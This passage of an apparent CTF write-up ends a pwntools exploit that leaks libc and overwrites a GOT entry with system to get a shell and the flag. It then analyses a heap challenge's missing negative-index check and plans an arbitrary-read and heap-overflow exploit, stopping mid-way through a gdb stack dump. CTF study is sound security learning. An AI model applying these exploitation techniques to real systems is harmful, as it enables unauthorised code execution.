</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>leak</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>puts</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;puts @ </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>leak</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;libc base @ </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binsh_ptr</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>fit</span><span class=p>({</span>
</span></span><span class=line><span class=cl>    <span class=mi>0</span><span class=p>:</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>system</span><span class=p>,</span> <span class=c1># what we want to write into exit GOT</span>
</span></span><span class=line><span class=cl>    <span class=mi>16</span><span class=p>:</span> <span class=mi>8</span><span class=p>,</span>              <span class=c1># size of write</span>
</span></span><span class=line><span class=cl>    <span class=mi>24</span><span class=p>:</span> <span class=n>binsh_ptr</span><span class=p>,</span>      <span class=c1># argument to puts</span>
</span></span><span class=line><span class=cl>    <span class=mi>32</span><span class=p>:</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>puts</span>    <span class=c1># we will write into here</span>
</span></span><span class=line><span class=cl><span class=p>}))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜ python3 solve.py
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;./notepad&#39;</span>
</span></span><span class=line><span class=cl>    Arch:     amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO
</span></span><span class=line><span class=cl>    Stack:    No canary found
</span></span><span class=line><span class=cl>    NX:       NX enabled
</span></span><span class=line><span class=cl>    PIE:      No PIE <span class=o>(</span>0x400000<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;./libc-2.31.so&#39;</span>
</span></span><span class=line><span class=cl>    Arch:     amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO
</span></span><span class=line><span class=cl>    Stack:    Canary found
</span></span><span class=line><span class=cl>    NX:       NX enabled
</span></span><span class=line><span class=cl>    PIE:      PIE enabled
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Starting <span class=nb>local</span> process <span class=s1>&#39;./notepad&#39;</span>: pid <span class=m>1572271</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> puts @ 0x7f2b72cb2e50
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> libc base @ 0x7f2b72c32000
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
</span></span><span class=line><span class=cl>Enter your note:
</span></span><span class=line><span class=cl>Received
</span></span><span class=line><span class=cl>$ cat flag.txt
</span></span><span class=line><span class=cl>blahaj<span class=o>{</span>4rb_r3ad_4rb_wr1te_and_rc3_in_on3??<span class=o>}</span>
</span></span></code></pre></div><h2 id=finale-christmas>FINALE: Christmas</h2><p>This was my favourite challenge in the CTF.</p><blockquote><p>All I want for Christmas is /bin/sh</p><p>Attachments: <a href=./attachments/pwn/christmas/santa>santa</a> <a href=./attachments/pwn/christmas/libc.so.6>libc.so.6</a></p></blockquote><h3 id=analysis>Analysis</h3><h4 id=brief-overview>Brief Overview</h4><p>This program is rather straightforward, everything is found in a single function. I&rsquo;ve cleaned up the decompiled code as shown below</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int64_t</span> <span class=n>choice</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int64_t</span> <span class=n>idx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=n>__int64_t</span> <span class=n>idxa</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=n>__int64_t</span> <span class=n>idxb</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int64_t</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=o>*</span><span class=n>wishlist</span><span class=p>[</span><span class=mi>10</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>128</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>wishlist</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>wishlist</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=nf>setup</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=nf>print_banner</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>print_menu</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nf>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>choice</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>switch</span> <span class=p>(</span><span class=n>choice</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>case</span> <span class=mi>1</span><span class=o>:</span>  <span class=c1>// add wish
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;There&#39;s just one thing I need&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;&gt; &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>idx</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>idx</span> <span class=o>&gt;=</span> <span class=mi>10</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Don&#39;t care about the presents underneath %ld and %ld</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>9LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;I won&#39;t ask for much this Christmas&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;&gt; &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>size</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>size</span> <span class=o>&gt;=</span> <span class=mi>0</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=n>wishlist</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;All I want for Christmas is&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;&gt; &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=nf>fgets</span><span class=p>(</span><span class=n>wishlist</span><span class=p>[</span><span class=n>idx</span><span class=p>],</span> <span class=n>size</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Invalid size&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>case</span> <span class=mi>2</span><span class=o>:</span>   <span class=c1>// remove wish
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;I won&#39;t make a list&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;&gt; &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>idxa</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>idxa</span> <span class=o>&gt;=</span> <span class=mh>0xA</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Don&#39;t care about the presents underneath %ld and %ld</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>9LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>wishlist</span><span class=p>[</span><span class=n>idxa</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=n>wishlist</span><span class=p>[</span><span class=n>idxa</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>case</span> <span class=mi>3</span><span class=o>:</span>   <span class=c1>// view wish
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Make my wish come true&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;&gt; &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>idxb</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>idxb</span> <span class=o>&gt;=</span> <span class=mh>0xA</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Don&#39;t care about the presents underneath %ld and %ld</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>9LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>wishlist</span><span class=p>[</span><span class=n>idxb</span><span class=p>]</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;All I want for Christmas is&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=nf>puts</span><span class=p>(</span><span class=n>wishlist</span><span class=p>[</span><span class=n>idxb</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Santa, won&#39;t you bring me the one I really need?&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>case</span> <span class=mi>4</span><span class=o>:</span>   <span class=c1>// exit
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nf>bye</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>default</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜ ./santa
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>all i want <span class=k>for</span> christmas is you!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>1. Add wish
</span></span><span class=line><span class=cl>2. Remove wish
</span></span><span class=line><span class=cl>3. View wish
</span></span><span class=line><span class=cl>4. Exit
</span></span><span class=line><span class=cl>&gt;
</span></span></code></pre></div><p>As we can see, this program serves a simple heap menu. Our options essentially are</p><ol><li>malloc chunk with size and contents of choice</li><li>free-ing heap chunk of choice</li><li>reading memory in heap chunk of choice</li></ol><h4 id=adding-a-wish-malloc>Adding a Wish (malloc)</h4><p>Let&rsquo;s take a closer look at the code that adds the wish.</p><p>This part of the code takes in 3 inputs. The first input reads in an integer that is used as the index of the program, and checked that it is no more than 10.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int64_t</span> <span class=n>idx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>idx</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=n>idx</span> <span class=o>&gt;=</span> <span class=mi>10</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Don&#39;t care about the presents underneath %ld and %ld</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>9LL</span><span class=p>);</span>
</span></span></code></pre></div><p>This unseemingly small snippet of code actually contains a vulnerability. It only checks the upper bounds of the integer input <em>(no more than 10)</em>, but it does not check for a lower bound <em>(more than 0?)</em>.</p><p>Let&rsquo;s keep looking at the subsequent code.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>size</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=n>size</span> <span class=o>&gt;=</span> <span class=mi>0</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>wishlist</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;All I want for Christmas is&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;&gt; &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fgets</span><span class=p>(</span><span class=n>wishlist</span><span class=p>[</span><span class=n>idx</span><span class=p>],</span> <span class=n>size</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Our second input reads in an integer that is used as the size of the allocated buffer. The allocated buffer is saved at an index within the wishlist array denoted by <code>idx</code>. Finally, our last input is read into the allocated buffer.</p><p>Due to the poor index checking for the <code>idx</code> variable, we can access negative indexes of the <code>wishlist</code> array &ndash; resulting in a OOB access of the array.</p><h4 id=removing-a-wish-free>Removing a Wish (free)</h4><p>Let&rsquo;s keep looking at the other parts of the code to see if they are also vulnerable. Let&rsquo;s now look at the switch case responsible for removing a wish.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>unsigned</span> <span class=n>__int64_t</span> <span class=n>idxa</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>128</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>idxa</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=n>idxa</span> <span class=o>&gt;=</span> <span class=mh>0xA</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Don&#39;t care about the presents underneath %ld and %ld</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>9LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>free</span><span class=p>(</span><span class=n>wishlist</span><span class=p>[</span><span class=n>idxa</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=n>wishlist</span><span class=p>[</span><span class=n>idxa</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span></code></pre></div><p>In this piece of code, the program once again reads in an integer that is used as an index to the freelist array. It only checks the upper bounds of the <code>idxa</code> variable. <strong>Does that mean that it is vulnerable to Out of Bound (OOB) access of the array once again?</strong></p><p>If we look at the defined type of the <code>idxa</code> variable, it is defined as an <strong>unsigned __int64_t</strong>. The word <strong>unsigned</strong> means that the variable can only contain positive numbers. If we try to do something like <code>0 - 1</code> on an unsigned integer, it will simply loop back to a <strong>large positive number</strong> and fail the check anyways.</p><p>Not only is this code not vulnerable, it also follows good code practices, NULL-ing the heap pointer after free-ing it.</p><h4 id=view-a-wish>View a Wish</h4><p>The final piece of code which views the wish is similar to this, and is not vulnerable. It simply prints the content in the allocated buffer.</p><h4 id=hidden-in-plainsight>Hidden in Plainsight</h4><p>We have identified a single vulnerable, which is that we are able to write at negative indexes of the wishlist array. The question now is: <strong>what will we overwrite by writing to negative indexes? is it useful for us?</strong></p><p>We can view the stack frame of the main function in IDA by double clicking on the local variable here</p><p><img src=./attachments/pwn/christmas/click_here.png alt=image></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>STACK</span> <span class=n>FRAME</span> <span class=n>OF</span> <span class=n>MAIN</span> <span class=n>FUNCTION</span> <span class=n>RELATIVE</span> <span class=n>TO</span> <span class=n>RBP</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mo>0000000000000100</span> <span class=n>limit</span>           <span class=n>dq</span> <span class=o>?</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mf>00000000000000F</span><span class=mi>8</span> <span class=n>choice</span>          <span class=n>dq</span> <span class=o>?</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mf>00000000000000F</span><span class=mi>0</span> <span class=n>idx</span>             <span class=n>dq</span> <span class=o>?</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mf>00000000000000E8</span> <span class=n>size</span>            <span class=n>dq</span> <span class=o>?</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mf>00000000000000E0</span> <span class=n>wishlist</span>        <span class=n>dq</span> <span class=mi>10</span> <span class=nf>dup</span><span class=p>(</span><span class=o>?</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mo>00000000000000</span><span class=mi>90</span> <span class=n>buf</span>             <span class=n>db</span> <span class=mi>128</span> <span class=nf>dup</span><span class=p>(</span><span class=o>?</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mo>0000000000000010</span>                 <span class=n>db</span> <span class=o>?</span> <span class=p>;</span> <span class=n>undefined</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mf>000000000000000F</span>                 <span class=n>db</span> <span class=o>?</span> <span class=p>;</span> <span class=n>undefined</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mo>000000000000000</span><span class=n>E</span>                 <span class=n>db</span> <span class=o>?</span> <span class=p>;</span> <span class=n>undefined</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mo>000000000000000</span><span class=n>D</span>                 <span class=n>db</span> <span class=o>?</span> <span class=p>;</span> <span class=n>undefined</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mo>000000000000000</span><span class=n>C</span>                 <span class=n>db</span> <span class=o>?</span> <span class=p>;</span> <span class=n>undefined</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mo>000000000000000</span><span class=n>B</span>                 <span class=n>db</span> <span class=o>?</span> <span class=p>;</span> <span class=n>undefined</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mo>000000000000000</span><span class=n>A</span>                 <span class=n>db</span> <span class=o>?</span> <span class=p>;</span> <span class=n>undefined</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mo>000000000000000</span><span class=mi>9</span>                 <span class=n>db</span> <span class=o>?</span> <span class=p>;</span> <span class=n>undefined</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mo>000000000000000</span><span class=mi>8</span> <span class=n>var_8</span>           <span class=n>dq</span> <span class=o>?</span>
</span></span><span class=line><span class=cl><span class=o>+</span><span class=mo>0000000000000000</span>  <span class=n>s</span>              <span class=n>db</span> <span class=mi>8</span> <span class=nf>dup</span><span class=p>(</span><span class=o>?</span><span class=p>)</span>  <span class=c1>// saved RBP
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>+</span><span class=mo>000000000000000</span><span class=mi>8</span>  <span class=n>r</span>              <span class=n>db</span> <span class=mi>8</span> <span class=nf>dup</span><span class=p>(</span><span class=o>?</span><span class=p>)</span>  <span class=c1>// return address
</span></span></span></code></pre></div><p>This shows us the offsets where the local variables are saved relative to <code>RBP</code> on the stack. As we can see, there are 4 variables that are saved at a negative address relative to the <code>wishlist</code> array.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=o>-</span><span class=mo>0000000000000100</span> <span class=n>limit</span>           <span class=n>dq</span> <span class=o>?</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mf>00000000000000F</span><span class=mi>8</span> <span class=n>choice</span>          <span class=n>dq</span> <span class=o>?</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mf>00000000000000F</span><span class=mi>0</span> <span class=n>idx</span>             <span class=n>dq</span> <span class=o>?</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=mf>00000000000000E8</span> <span class=n>size</span>            <span class=n>dq</span> <span class=o>?</span>
</span></span></code></pre></div><p>We have seen the <code>choice</code> <code>idx</code> <code>size</code> variables before, but what is <code>limit</code>? We can click on the word <code>limit</code> and press the <strong>X</strong> key to view cross references in IDA. We will look at one occurrence of the <code>limit</code> variable in assembly.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000001424</span>                 <span class=nf>mov</span>     <span class=p>[</span><span class=no>rbp</span><span class=err>+</span><span class=no>limit</span><span class=p>],</span> <span class=mi>0</span><span class=no>Ah</span>
</span></span><span class=line><span class=cl><span class=na>...</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>000000000000152</span><span class=nf>A</span>                 <span class=no>cmp</span>     <span class=no>rax</span><span class=p>,</span> <span class=p>[</span><span class=no>rbp</span><span class=err>+</span><span class=no>limit</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nl>.text:</span><span class=err>0000000000001531</span>                 <span class=nf>jl</span>      <span class=no>short</span> <span class=no>loc_155F</span>
</span></span></code></pre></div><p>The assembly above corresponds to</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=n>idxa</span> <span class=o>&gt;=</span> <span class=mh>0xA</span> <span class=p>)</span>
</span></span></code></pre></div><p>in our decompilation. What happened? Is our pseudocode a lie? The assembly shows that our pseudocode should look like</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=n>limit</span> <span class=o>=</span> <span class=mi>10</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1>// ... truncated ...
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span> <span class=n>idxa</span> <span class=o>&gt;=</span> <span class=n>limit</span> <span class=p>)</span>
</span></span></code></pre></div><p>but our pseudocode simply does not show the <code>limit</code> variable. <strong>This actually happens because IDA has identified our <code>limit</code> variable to be a constant value of 10 and thus optimizes away all occurences of <code>limit</code> and replace it with the corresponding constant integer.</strong></p><h3 id=exploit-strategy>Exploit Strategy</h3><p>Now that we have identified that we can overwrite <code>choice</code>, <code>idx</code>, <code>size</code> and <code>limit</code>, how can it help us? We can abuse this negative OOB write to give us more flexibility in our exploit</p><ol><li>By overwriting <strong>limit</strong>, we are able to make our <strong>limit</strong> a huge number. This will help us extend our OOB read from negative indexes, to even writing to large positive indexes.<ul><li>Furthermore, this will give us an read-anywhere/arbitrary read primitive, which I will explain soon</li></ul></li><li>By overwriting <strong>size</strong>, we are able to cause a heap overflow when adding a wish as we would be able to input an arbitrarily large sized integer.</li></ol><h4 id=arbitrary-read>Arbitrary Read</h4><p>Assume that we have already increased our <code>limit</code> to a huge value. We will be able to view wishes <em>(print the contents of a pointer)</em> at large indexes beyond the wishlist array. This will be crucial in bypassing both <strong>Positional Independent Executable (PIE)</strong> and <strong>Address Space Layout Randomization (ASLR)</strong> protections. In order to see what we can leak, we will look at the stack of the program in GDB.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-css data-lang=css><span class=line><span class=cl><span class=nt>pwndbg</span><span class=o>&gt;</span> <span class=nt>tele</span> <span class=nt>50</span>
</span></span><span class=line><span class=cl>                 <span class=c>/* start of main function&#39;s stack frame */</span>
</span></span><span class=line><span class=cl><span class=nt>00</span><span class=p>:</span><span class=nd>0000</span><span class=err>│</span> <span class=nt>rsp</span>     <span class=nt>0x7fffffffde30</span> <span class=err>◂—</span> <span class=nt>0xa</span> <span class=c>/* limit */</span>
</span></span><span class=line><span class=cl><span class=nt>01</span><span class=p>:</span><span class=nd>0008</span><span class=err>│</span>         <span class=nt>0x7fffffffde38</span> <span class=err>◂—</span> <span class=nt>0x1</span> <span class=c>/* choice */</span>
</span></span><span class=line><span class=cl><span class=nt>02</span><span class=p>:</span><span class=nd>0010</span><span class=err>│</span>         <span class=nt>0x7fffffffde40</span> <span class=err>◂—</span> <span class=nt>0x2</span> <span class=c>/* idx */</span>
